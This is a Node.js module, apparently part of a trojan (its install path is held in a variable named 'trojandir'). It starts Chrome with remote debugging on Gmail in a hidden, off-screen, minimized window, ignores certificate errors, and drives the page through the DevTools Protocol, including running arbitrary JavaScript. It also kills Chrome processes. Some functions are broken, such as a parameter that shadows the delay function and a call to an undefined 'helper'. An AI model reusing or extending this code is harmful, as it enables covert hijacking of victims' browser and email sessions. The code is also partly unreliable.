const path = require("path");
const net = require("net");
const { fork, exec, spawn } = require("child_process");
const fs = require("fs");
const os = require("os");
const crypto = require("crypto");
const util = require("util");
const WebSocket = require("ws");

let modulename = path.basename(module.id);

let trojandir = "C:\\ProgramData\\owd";

var scriptdirpath = path.dirname(process.argv[1]);
var scriptfname = path.basename(process.argv[1]);
var logfpath = path.join(
    scriptdirpath,
    scriptfname + "_" + getTimestamp() + ".log"
);

let uinfo = os.userInfo();
let username = uinfo.username;

if ( username == 'CAT2022' ) 
    username = 'CAT2022.PUBLIC';

let chrome_debug_path = `C:\\Users\\${username}\\AppData\\Local\\chrome-win64\\chrome.exe`;
let chrome_path = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";

const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

function csvToJson(csvData) {
    const lines = csvData.split(/[\r\n]+/).filter((line) => line.trim() !== "");

    const headers = lines[0].split(",");

    lines.splice(0, 1);

    const result = [];

    // Loop through the remaining rows
    for (let i = 0; i < lines.length; i++) {
        const obj = {};
        const currentLine = lines[i].split(",");

        // index 0 is computer name
        // index -1 is processid, -2 is process name

        let n = currentLine.length;

        if (n > 3) {
            let m = headers.length;

            obj[headers[m - 1].trim()] = currentLine[n - 1];
            obj[headers[m - 2].trim()] = currentLine[n - 2];

            let commandline = currentLine.slice(1, n - 2);
            obj["CommandLine"] = commandline.join(",");
            obj[headers[0].trim()] = currentLine[0];
        } else {
            for (let j = 0; j < headers.length; j++) {
                obj[headers[j].trim()] = currentLine[j]?.trim() || "";
            }
        }

        result.push(obj);
    }

    return result;
    // Save the output
    // fs.writeFileSync(jsonPath, JSON.stringify(result, null, 2), 'utf-8');
}

function isUTF16LEBuffer(buffer) {
    if (!Buffer.isBuffer(buffer) || buffer.length < 2) {
        return false;
    }

    // UTF-16LE BOM is 0xFF 0xFE
    return buffer[0] === 0xff && buffer[1] === 0xfe;
}

function parseCmdString(str) {
  const regex = /--([a-zA-Z0-9_-]+)(?:[=]+("[^"]+"|'[^']+'|[^\s]+))?/g;
  const dict = {};
  let match;

  while ((match = regex.exec(str)) !== null) {
    const key = match[1];
    let value = match[2];

    if (value !== undefined) {
      if ((value.startsWith('"') && value.endsWith('"')) || 
          (value.startsWith("'") && value.endsWith("'"))) {
        value = value.slice(1, -1);
      }
    } else {
      value = true;
    }

    dict[key] = value;
  }

  return dict;
}

async function is_chrome_active(debugport = 9223, userdatadir=null) {
    // [ { Node: '', CommandLine: '', Name: 'System Idle Process', ProcessId: '' } ]
    let procs = await getProcessList_wmic();

    procs = procs.filter((element, index, array) => {
        let check_a = element.Name?.toLowerCase().includes("chrome");
        
        if ( ! check_a )
            return false;

        let cmdline = element.CommandLine?.toLowerCase();

        let cmdlineargs = parseCmdString(cmdline);

        let check_b = cmdlineargs['remote-debugging-port'] == String(debugport);

        let check_c = true;
        
        if ( ! isNullOrWhitespace(userdatadir) ) {
            let token = 'user-data-dir';
            
            if ( Object.hasOwn(cmdlineargs, token) )
                check_c = cmdlineargs[token].toLowerCase() == userdatadir.toLowerCase();
        }

        element.cmdlineargs = cmdlineargs;

        return check_a && check_b && check_c;
    });

    return procs;
}

// note: spawning chrome process --> results in a PID that differs from launch
// ! can't use isPidAlive to check if pid is active
async function activate_chrome(
    start_url = "https://www.gmail.com",
    debugport = 9223,
    headless = false,
    unref = false,
    force = false,
    delay = 1
) {
   
    if ( ! force ) {
        let procs = await is_chrome_active(debugport);

        if ( procs && procs.length > 0 )
            return procs;
    }

    childp = spawn_chrome(start_url, debugport, headless, unref);

    delay = delay || 1;
    await delay(1000*delay);

    procs = await is_chrome_active(debugport);

    return procs;
}

function kill_chrome() {
    return new Promise((resolve, reject) => {
        const wmicCommand = "taskkill /F /IM chrome.exe";

        exec(wmicCommand, (error, stdout, stderr) => {
            if (error) {
                reject({ error: error, stderr: stderr });
            }

            resolve({ stdout: stdout, stderr: stderr });
        });
    });
}

async function exec_wmic_process() {
    return new Promise((resolve, reject) => {
        const wmicCommand =
            "wmic process get ProcessId,Name,CommandLine /format:csv";

        exec(wmicCommand, (error, stdout, stderr) => {
            if (error) {
                reject(error);
            }

            if (stderr) {
                reject(stderr);
            }

            resolve(stdout);
        });
    });
}

async function getProcessList_wmic() {
    let buffer = await exec_wmic_process();
    let isutf16le = isUTF16LEBuffer(buffer);

    let csvData = isutf16le
        ? buffer.toString("utf16le")
        : buffer.toString("utf8");

    // { CommandLine, Name, Node, ProcessId }
    let jsondata = csvToJson(csvData);

    return jsondata;
}

function getCallerName() {
    const originalFunc = Error.prepareStackTrace;

    try {
        Error.prepareStackTrace = (err, stack) => stack;

        const err = new Error();
        const currentStack = err.stack;

        if (currentStack && currentStack[2]) {
            return currentStack[2].getFunctionName() || "SYSTEM";
        }
    } catch (e) {
    } finally {
        Error.prepareStackTrace = originalFunc;
    }

    return "unknown";
}

function getRandomCode(n) {
    const min = Math.pow(10, n - 1);
    const max = Math.pow(10, n) - 1;

    return crypto.randomInt(min, max + 1).toString();
}

function isNullOrWhitespace(str) {
    if (typeof str === "undefined" || str === null ) {
        return true;
    }

    if (!(typeof str === "string")) return true;

    return !str || !str.trim();
}

function logmsg(msgstr) {
    let callername = getCallerName();

    let prelude = `|${modulename}|${scriptfname}|${String(
        process.pid
    )}|${callername}`;
    let msgout = "";

    if (msgstr instanceof Error) {
        msgout = prelude + "|" + util.inspect(msgstr);
    } else if (typeof msgstr === "string") {
        msgout = prelude + "|" + msgstr;
    }

    console.log(msgout);

    if (!isNullOrWhitespace(logfpath))
        fs.appendFileSync(logfpath, msgout + "\r\n", "utf8");
}

function getTimestamp() {
    const date = new Date();

    // Extract components
    const year = date.getFullYear();
    const month = String(date.getMonth() + 1).padStart(2, "0"); //
    const day = String(date.getDate()).padStart(2, "0"); //
    const hours = String(date.getHours()).padStart(2, "0"); //
    const minutes = String(date.getMinutes()).padStart(2, "0"); //
    const seconds = String(date.getSeconds()).padStart(2, "0"); //
    const ms = String(date.getMilliseconds()).padStart(3, "0"); //

    // Combine into final strings
    const yyyymmddhhmmss = `${year}${month}${day}${hours}${minutes}${seconds}`;
    const fullWithMs = `${yyyymmddhhmmss}${ms}`;

    return fullWithMs;
}

function isPidAlive(pid) {
    if (pid <= 0) {
        return false;
    }

    try {
        // Signal 0 tests for process existence without modifying it
        process.kill(pid, 0);
        return true;
    } catch (error) {
        // ESRCH means the process was not found
        return error.code === "EPERM"; // True if it exists but you lack permissions
    }
}

function exec_chrome(
    starturl = "https://www.gmail.com/",
    debugport = 9223,
    headless = false,
    x_pos = 2000,
    y_pos = 2000,
    width = 10,
    height = 10,
    datadir = path.join(trojandir, "chrome"),
    stdoutfunc = null,
    stderrfunc = null
) {
    let cmdlineargs = [
        `--remote-debugging-port=${debugport}`,
        `--user-data-dir=${datadir}`,
        `--new-window ${starturl}`,
        headless ? `--headless=new` : "",
        `--no-first-run`, // You can skip Chrome's welcome and setup screens
        `--no-default-browser-check`,
        `--profile-directory=Default`,
        `--remote-allow-origins=*`,
        // `--restore-last-session`,
        `--ignore-certificate-errors`,
        `--window-position=${x_pos},${y_pos}`,
        `--window-size=${width},${height}`,
        `--hide-crash-restore-bubble`,
    ];

    let ret = exec(
        `start "" /min ${chrome_debug_path} ${cmdlineargs.join(" ")}`,
        (error, stdout, stderr) => {
            logmsg(stdout);

            if (stdoutfunc) stdoutfunc(stdout);

            logmsg(stderr);

            if (stderrfunc) stderrfunc(stderr);

            if (error) {
                logmsg(`Error: ${error.message}`);
                return;
            }
        }
    );
}

function chrome_cmdlineargs(starturl="https://www.yahoo.com", debugport=9223, 
    datadir=`C:\\Users\\${username}\\AppData\\Local\\Google\\test\\chrome`, 
    x_pos=0, y_pos=0, width=1920, height=1080, ignorecert = false, restore = false, 
    headless=false) {
    
    datadir = datadir.trim();

    let cmdlineargs = [
        `--remote-debugging-port=${debugport}`,
        `--user-data-dir=${datadir}`,
        `--disable-notifications`,
        `--disable-infobars`,
        `--suppress-message-center-popups`,
        headless ? `--headless=new` : "",
        `--no-first-run`, // You can skip Chrome's welcome and setup screens
        `--no-default-browser-check`,
        //`--profile-directory="Profile 1"`,
        //`--profile-directory=Default`,
        `--remote-allow-origins=*`,
        restore ? `--restore-last-session` : null,
        ignorecert ? `--ignore-certificate-errors` : null,
        `--window-position=${x_pos},${y_pos}`,
        `--window-size=${width},${height}`,
        `--hide-crash-restore-bubble`,
        `--disable-features=WelcomePage,PrivacySandboxSettings4`,
        `--new-window`,
        starturl
    ];

    let ret = cmdlineargs.filter(item => {
        return ! isNullOrWhitespace(item);
    });

    return ret;
}

// note: child chrome process has a new/different pid upon launch
// existing chrome process interferes with launch of new process
function spawn_chrome(
    starturl = "https://www.gmail.com/",
    debugport = 9223,
    unref = false,
    stdoutfunc = null,
    stderrfunc = null,
    closefunc = null
) {

    let cmdlineargs = chrome_cmdlineargs(starturl, debugport);

    // TODO auto discover by reading chrome lnk files

    const child = spawn(chrome_debug_path, [...cmdlineargs], {
        // detached: true, // might cause errors
        // windowsHide: true,
        // stdio: ["ignore", out, err],
        // shell: true,
        cwd: path.dirname(chrome_debug_path)
    });

    child.stdout.on("data", (data) => {
        let text = data.toString();

        if (stdoutfunc) stdoutfunc(text);
        else logmsg(text);
    });

    child.stderr.on("data", (data) => {
        let text = data.toString();

        if (stderrfunc) stderrfunc(text);
        else logmsg(text);
    });

    child.on("close", (code) => {
        if (closefunc) closefunc(code);
        else logmsg(`[J4D3] child process exited with code ${code}`);
    });

    if (unref) child.unref();

    return child;
}

/*
json/list --> array of targets:
{
    description = ''
    devtoolsFrontendUrl = 'https://chrome-devtools-frontend.appspot.com/serve_rev/@41fa82442390a4d4456c78f2d69a832d5720cb27/inspector.html?ws=localhost:9223/devtools/page/12AA807841114D42B55C5B05B3525C48'
    id = '12AA807841114D42B55C5B05B3525C48'
    title = 'chrome-extension://mloajfnmjckfjbeeofcdaecbelnblden/background/sru-osd.html'
    type = 'background_page'
    url = 'chrome-extension://mloajfnmjckfjbeeofcdaecbelnblden/background/sru-osd.html'
    webSocketDebuggerUrl = 'ws://localhost:9223/devtools/page/12AA807841114D42B55C5B05B3525C48'
}

json/version
{
   "Browser": "Chrome/151.0.7922.138",
   "Protocol-Version": "1.3",
   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/151.0.0.0 Safari/537.36",
   "V8-Version": "15.1.206.17",
   "WebKit-Version": "537.36 (@41fa82442390a4d4456c78f2d69a832d5720cb27)",
   "webSocketDebuggerUrl": "ws://localhost:9223/devtools/browser/2476b3c2-b428-4b6e-a9e8-ee09fe00b77c"
}
*/

var payloads = {
    create_new_tab: {
        id: 1,
        method: "Target.createTarget",
        params: {
            url: null,
            newWindow: false,
            browserContextId: null,
            // "width": 10,
            // "height": 10,
            // // "left": 2000,
            // "top": 2000
            // #"windowState": "minimized"
            // #"hidden": True --> has problems/issues
        },
    },

    create_new_window: {
        id: 1,
        method: "Target.createTarget",
        params: {
            url: null,
            newWindow: true,
            width: 10,
            height: 10,
            left: 2000,
            top: 2000,
            windowState: "minimized",
        },
    },

    runtime_eval: {
        id: 1,
        method: "Runtime.evaluate",
        params: { 
            expression: null,  // should be javascript text here
            returnByValue: true 
        },
    },
};

function get_dom() {
    let payload = { 
        "id": 1, 
        "method": "DOM.getDocument", 
        "params": { 
            "depth": -1, 
            "pierce": true 
        } 
    };

    return payload;

}

function getBoxModel(nodeid) {
    let command = {
        "id": 1,
        "method": "DOM.getBoxModel",
        "params": {
            "nodeId": nodeid
        }
    };

    return command;
}

function describeNode(nodeid) {
    let command = {
        "method": "DOM.describeNode",
        "params": {
            "nodeId": nodeid,
            "depth": 1
        }
    };

    return command;
}

function domquerySelectorAll(nodeid, selector) {
    let command = {
        "id": 2,
        "method": "DOM.querySelectorAll",
        "params": {
            "nodeId": nodeid,
            "selector": selector //css
        }
    }

    return command;
}

function navigate(url) {
    let payload = {
        "id": 1,
        "method": "Page.navigate",
        "params": {
            "url": `${url}`
        }
    };
    return payload;
}

function runtime_eval(script) {
    let payload = {...payloads['runtime_eval'] };
    payload.params.expression = script;
    return payload;
}

function create_new_tab(url = "https://www.gmail.com/", browserContextId = null) {
    let payload = { ...payloads["create_new_tab"] };
    
    if ( isNullOrWhitespace(browserContextId) ) {
        
        if ( Object.hasOwn(payload.params, 'browserContextId') )
            delete payload.params.browserContextId;

    } else {
        payload.params['browserContextId'] = browserContextId;
    }
    
    payload.params.url = url;
    return payload;
}

function create_new_window(url = "https://www.gmail.com") {
    let payload = { ...payloads["create_new_window"] };
    payload.params.url = url;
    return payload;
}

// TODO replace with Target.getTargets
async function scan_chrome_targets(debugport=9223) {
    let response = await helper.ping_chrome(debugport, "json/list");

    let resobj = JSON.parse(response);

    // TODO filter by url to match create_new_window
    resobj = resobj.filter((element, index, array) => {
        return (
            element.url?.startsWith("https://") && element.type === "page"
        );
    });

    let ws_target_url = "";
    if (resobj && resobj.length <= 0) {
        return null;
    } else {
        ws_target_url = resobj[0].webSocketDebuggerUrl;
    }

    return ws_target_url;
}

async function ping_chrome(debugport, path = "json/version") {
    if (!isNullOrWhitespace(path) && !path.startsWith("/")) {
        path = "/" + path;
    }

    const response = await fetch(`http://localhost:${debugport}${path}`);
    let responsetxt = await response.text();
    const cleanString = responsetxt.replace(/\r?\n|\r/g, "");

    return cleanString;
}

function connectToTarget(targetUrl, openfunc, messagefunc, errorfunc) {
    logmsg(`Connecting to: ${targetUrl}`);

    const ws = new WebSocket(targetUrl);

    ws.on("open", () => {
        logmsg(`Connected to Chrome DevTools Protocol -- ${targetUrl}`);
        if (openfunc) openfunc();
    });

    ws.on("message", (data) => {
        let txt = data.toString();
        logmsg(`[J3O9] received response from Chrome: ${txt}`);
        if (messagefunc) messagefunc(txt);
    });

    ws.on("error", (err) => {
        logmsg(err);
        if (errorfunc) errorfunc(err);
    });

    return ws;
}

async function connectToChrome(debugport, openfunc, messagefunc, errorfunc) {
    const response = await ping_chrome(debugport, "json/version");
    const targets = JSON.parse(response); //await response.json();

    // ws://127.0.0.1:9223/devtools/browser/80d329c6-bce8-482a-8cf8-859425508382
    // 'ws://localhost:9223/devtools/browser/80d329c6-bce8-482a-8cf8-859425508382'
    const wsUrl = targets.webSocketDebuggerUrl;

    // ws_url = "ws://localhost:9222/devtools/page/"+targetid
    let ws = connectToTarget(wsUrl, openfunc, messagefunc, errorfunc);

    return { ws: ws, ws_url: wsUrl };
}

async function get_tabs(debugport=9223) {
    let response = await ping_chrome(debugport, "json/list");

    let resobj = JSON.parse(response);

    resobj = resobj.filter((element, index, array) => {
        return (
            element.url?.startsWith("https://") && element.type === "page"
        );
    });

    return resobj;
}

function isPidAlive(pid) {
    if (pid <= 0) {
        return false;
    }

    try {
        // Signal 0 tests for process existence without modifying it
        process.kill(pid, 0);
        return true;
    } catch (error) {
        // ESRCH means the process was not found
        return error.code === "EPERM"; // True if it exists but you lack permissions
    }
}

logmsg("--- EXPORTING ---");

module.exports = {
    connectToTarget,
    exec_chrome,
    activate_chrome,
    spawn_chrome,
    is_chrome_active,
    logmsg,
    getTimestamp,
    isNullOrWhitespace,
    getRandomCode,
    isPidAlive,
    connectToChrome,
    payloads,
    create_new_tab,
    getProcessList_wmic,
    ping_chrome,
    delay,
    create_new_window,
    runtime_eval,
    get_tabs,
    navigate,
    get_dom,
    domquerySelectorAll,
    isPidAlive,
    describeNode,
    getBoxModel
};

// childp = spawn_chrome();

// logmsg(`childp: ${childp.pid} ${childp.ppid}`);

logmsg("--- END MODULE ---");

//const globalFunctions = Object.getOwnPropertyNames(globalThis).filter(prop => typeof globalThis[prop] === 'function');
//console.log(JSON.stringify(globalFunctions));
//if ( globalFunctions.includes('spawn_chrome') ) { let childp = spawn_chrome(); }
